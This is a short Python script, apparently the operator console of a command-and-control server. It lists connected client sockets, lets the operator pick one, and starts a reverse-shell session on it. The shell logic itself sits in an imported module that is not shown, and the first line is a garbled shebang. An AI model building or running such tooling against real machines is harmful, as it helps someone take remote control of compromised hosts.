#!/usr/#!/usr/bin/env python
#coding=utf-8

__author__ = 'Karl Boulais'

from argparse import ArgumentParser
from time import sleep

from cnc.server import Server

def argParse():
    p = ArgumentParser()

    return p


def main():
    s = Server()
    s.main()

    printed = False
    while True:
        sleep(0.5)

        if not s.inSession:    
            if len(s.cSocket) > 0:
                printed = False
                choix = None
                for elem in s.cSocket:
                    i = s.cSocket.index(elem)
                    print(f"{i} {s.cAddr[i]}")
                try:
                    choix = int(input("\n choix: "))
                except Exception:
                    continue
                if choix is not None:
                    s.inSession = True
                    s.startReverseShellInstance(s.cSocket[choix])
            elif not printed:
                printed = True
                print("There is no client...")
    # args = argParse().parse_args()
    # display CnC



if __name__ == "__main__":
   main()